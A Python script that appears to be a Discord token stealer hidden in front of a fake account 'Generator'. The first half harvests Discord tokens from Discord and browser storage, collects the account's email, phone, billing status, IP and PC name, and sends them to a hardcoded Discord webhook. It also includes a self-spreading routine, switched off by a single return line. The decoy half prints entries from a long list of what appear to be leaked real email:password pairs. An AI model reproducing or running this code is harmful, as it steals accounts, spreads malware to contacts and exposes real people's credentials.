import os

if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv

WEBHOOK_URL = "https://discord.com/api/webhooks/910457112306536478/-pCDCx7AJpDtXN3fiIoKk-sjmbMX55eO0kl6d9O99zmDvi_5D9IXOenbYyqyAnfEZC9g" # Insert webhook url here

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}


def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass


def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def whoTheFuckAmI():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip


def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass


def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass


def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass


def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass


def spread(token, form_data, delay):
    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
    for friend in getFriends(token):
        try:
            chat_id = getChat(token, friend["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)


def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "|Account Info|",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "|PC Info|",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "|Token|",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                },
                "footer": {
                    "text": f"Visit my website for more Cybersecurity contents: un5t48l3.com"
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
    }
    try:
        
        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()


try:
    main()
except Exception as e:
    print(e)
    pass

import time
import random
list2 = [ '[SFA]', '[NFA]',]
list = [
'trinitty@bk.ru:trinitty',
'hmandes8@bk.ru:2376bluey',
'gocel.denisx@bk.ru:michel1964',
'fly1985@bk.ru:zcbmqet1985123',
'oksana.bajtugelova@bk.ru:oksana.bajtugelov',
'egor.zubov@bk.ru:5991egorqwe',
'krasnobaevk@bk.ru:windom',
'takam@bk.ru:0852052',
'ceka555@bk.ru:bmw55',
'kamil_quliyev_1998@bk.ru:199816',
'ellie.4@bk.ru:81julian',
'zhadan_ks@bk.ru:dgtru9871',
'andreych-86@bk.ru:jktymrf1',
'kuzen_@bk.ru:Tdutybq5533',
'mila0001@bk.ru:mila000',
'st1xbo@bk.ru:st1xb',
'mkuznedelev@bk.ru:repytltktd',
'oborodena@bk.ru:fbobh_6',
'trialhidden@bk.ru:dimidrol11',
'lexi.olivarez@bk.ru:ladybug1',
'xjohann-eichwald@bk.ru:Natali1983',
'zefi@bk.ru:zefi',
'akinonnw2011@bk.ru:moyxahpwhflfdvo11',
'chanywatts.au@bk.ru:sum07els12',
'egoiste89@bk.ru:dfvgbhqwe',
'zhila88@bk.ru:89208046276qwe',
'sznhpt@bk.ru:00sara00',
'enotskiy@bk.ru:enotsk',
'zolkina@bk.ru:qwerty',
'herbertus.scott.1935@bk.ru:nokia20001',
'davidapelyan@bk.ru:david200012',
'j.l.ruth@bk.ru:ruth19',
'kamila-18@bk.ru:kamila-1',
'tttttanya@bk.ru:helado12',
'nc_bhb@bk.ru:esmikomasd',
'1234guf@bk.ru:1234gtaasd',
'wiktor1993@bk.ru:84742',
'dima1990.90@bk.ru:d40411',
'wchampion28@bk.ru:waynec0',
'j_u_d_o.kz-94@bk.ru:judokz11',
'xosha@bk.ru:ujkjdjkjvrf12',
'extremal777@bk.ru:12345',
'george.theresin@wanadoo.fr:220960',
'supersmail@bk.ru:pokemon6912',
'valerijj-nazarov00@bk.ru:7qUfUxh',
'ageshcu@gmail.com:ambati',
'shafaqlovely@bk.ru:pakistani12',
'lallemantgautier@sfr.fr:telephone',
'rgauville@aliceadsl.fr:handball',
'alain.massignac@sfr.fr:3apj7f',
'moysan.pierrick@wanadoo.fr:olives',
'qweasd_1984@bk.ru:12345asd',
'vind111@bk.ru:defenderasd',
'jerome.denots@orange.fr:normandie',
'ccmail66@orange.fr:datura',
'nikita1@bk.ru:6679807n',
'ivan_1208@bk.ru:bdfy',
'victoria_paige9193@bk.ru:Vpbjfc9193',
'buis.benjamin@free.fr:Aboleth1',
'laurentcosta2@wanadoo.fr:100565',
'zannakaz@bk.ru:1qazxsw2123',
'ur_28@bk.ru:RFIFTD1995asd',
'martine.sigot@outlook.fr:effy0808',
'smirnova_ulia1986@bk.ru:samdom777',
'alicia.casica.796@k12.friscoisd.org:07222003',
'hu.j@wanabo.fr:laly1205',
'diana.35.03@bk.ru:2445685w',
'mays_trent@bk.ru:tgibson95',
'kioschi@bk.ru:auroraasd',
'ptashkaflud@bk.ru:123456',
'sobaka-85@bk.ru:hfcrevfh123asd',
'famille.fosse.rene@orange.fr:nenesse',
'alexandre.villet@wanadoo.fr:barcelone',
'branquet.b@wanadoo.fr:briactu',
'idr76@voila.fr:2033567',
'gwenael.brehelin@orange.fr:pirates56',
'muz-vic@leire.freeserve.co.uk:tegz123',
'claudie.patelli@orange.fr:didi78',
'olivier.le-nouaille@etudiant.univ-reims.fr:olive229',
'famillekobus@club-internet.fr:a707cc',
'312312game@bk.ru:1q2w3e4r5t',
'laurencederrien@sfr.fr:doume1957',
'kirafoma@bk.ru:melkiy8',
'lattucavincent@neuf.fr:lmjo1y',
'kononenko.2012@bk.ru:1654068azaz',
'jacky.13@orange.fr:hsgn1a',
'jojosaad@sfr.fr:jonathan',
'star_lady@bk.ru:cfifbhfhjvfqwe',
'johnnyblade34@bk.ru:jesse3423',
'anton@bk.ru:wrfdfgf',
'pigeon.nicolas@free.fr:raravis',
'goodcharlotte.77100@wanadoo.fr:271288',
'janou_8@sfr.fr:celilefra',
'gavnoda@bk.ru:gavnoda1123',
'pdg@umalis.fr:Doudou1993',
'axelle.bordet@free.fr:walkingdead',
'trofimova@bk.ru:vipvipvip5111',
'ines1973@orange.fr:45278d',
'sitchihin69@bk.ru:a111213',
'nekanon@bk.ru:Nikiforov12',
'andre.delargilliere@wanadoo.fr:boubou',
'boucherot.franck@neuf.fr:0p2r85',
'evajeannehuer@outlook.fr:ajma2002',
'francky.letranchant@bbox.fr:manon24',
'westn2006@gmail.com:westn2006',
'ljxf12@bk.ru:yfcnz1123',
'b.journiac@orange.fr:Oym3ni',
'lafrechine.nathalie@neuf.fr:lana31',
'stephane.gigot@free.fr:alonso',
'sad-panda@bk.ru:dfy.irfqwe',
'greq@sdgf.fr:learthur',
'kolesa2@bk.ru:12345',
'singh.shalinir1@bk.ru:ps722116',
'fds-dd@bk.ru:123123qwe',
'valentina-1990@bk.ru:123456qwe',
'lazar.197@bk.ru:qweasdzxc',
'mmx4ever@bk.ru:570427asd',
'ciappara.corinne@orange.fr:victor',
'sandra1@bk.ru:ikey2213',
'mathys.rennela@etu.univ-paris-diderot.fr:bed27d7',
'rafis-ismagilov@bk.ru:rafisismagilovasd',
'nicolas.simon83@sfr.fr:pm48e4',
'marion.coppin@wanadoo.fr:dominette',
'ffroment@ramery.fr:emmas',
'faathj@yaho.fr:mamadou',
'madelaine.combat@sfr.fr:6thx4m',
'toumani@517.fr:12345678',
'rany.si@voila.fr:0000',
'f.bailleux@aliceadsl.fr:melisa',
'grosselouloutte@orange.fr:765366',
'irene.granjon@libertysurf.fr:5laeti11',
'smirnova68@bk.ru:smirnova',
'sonya.smirnova.97@bk.ru:RJqdXKBP',
'gavrik99@bk.ru:123456',
'diana.constantin38@orange.fr:lewiss',
'lilousanto@voila.fr:9yoxay',
'lachenille2008@orange.fr:lili555',
'uk4npaer@bk.ru:qwertyasd',
'didiersuper@neuf.fr:tomtomtom',
'mishahome@bk.ru:Eastsaen12',
'oty2235@gmail.com:uzimaki',
'ludice@orange.fr:20232728',
'Jackson.Neese.920@k12.friscoisd.org:04252001',
'artuard@gmail.com:Sapkowski10',
'gradperm@bk.ru:1981olga11',
'jkrejberg@bk.ru:456838',
'rijaya.bestiya2007@bk.ru:2452348',
'patricia.rosian@wanadoo.fr:papillon',
'vanessafoucault@outlook.fr:vanessa53',
'enocqcatherine@wanadoo.fr:coyotte82',
'pk1963@bk.ru:stanga',
'vincent.lanz@neuf.fr:00000',
'nairolf76@htmail.fr:tebe17',
'as-center@bk.ru:anastasya123',
'lucas26@wanadoo.fr:26Janvier',
'pautonnier.claudine@free.fr:clovgc38',
'ndeville@sfr.fr:tess2002',
'enzo08050102@homail.fr:celine122',
'jod@bk.ru:bobino7',
'cynthia.bitsch@neuf.fr:cyncyn',
'silmdp@free.fr:giogio',
'devoscatherine@free.fr:tul3k6',
'dubche@wanadoo.fr:15051505',
'krivchuk111@bk.ru:krivchuk1',
'pierre.mignard-1998@orange.fr:mariage2000',
'jean.larue@neuf.fr:monique',
'ambotx@bk.ru:iamgod',
'bataz@orange.fr:jonasse',
'doris.correc@univ-lyon2.fr:simpsons',
'n.s.shitova@bk.ru:21111996qwqwe',
'betty@wanadoo.fr:01234',
'Huygheth@Johnson.fr:theo59',
'Guillermo.Aldape.557@k12.friscoisd.org:02151999',
'pro-ab@outlook.fr:bealive0013',
'liza.krier@gmx.fr:Balou1994',
'roger.glath@sfr.fr:reguisheim',
'brahim.ghali@outlook.fr:barhoum',
'dsanglier@orange.fr:Sedan08',
'corentin2501@wanadoo.fr:lucas2001mafia',
'cassius.francis23@gmail.com:shadows321',
'cathy.levasseur@orange.fr:loulou',
'mr.lybovnik@bk.ru:gjpyzrjdcrbq19911',
'jules.parpaite@sfr.fr:Costebelle06',
'kiryanova-irina@bk.ru:kiryanova-irin',
]
title = ("""
 _   _ _                 _       _____            
| | | (_)               ( )     |  __ \           
| | | |_ _ __  _ __ _ __|/ ___  | |  \/ ___ _ __  
| | | | | '_ \| '__| '__| / __| | | __ / _ \ '_ \ 
\ \_/ / | |_) | |  | |    \__ \ | |_\ \  __/ | | |
 \___/|_| .__/|_|  |_|    |___/  \____/\___|_| |_|
        | |                                       
        |_|                                       
""")

print(title)
input("Press Enter to start generating...")
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[SFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[SFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[SFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[SFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[SFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[SFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[SFA]"),random.choice(list))
time.sleep(0.5)
print(("[Error]"),random.choice(list))
time.sleep(0.5)
print(("[NFA]"),random.choice(list))
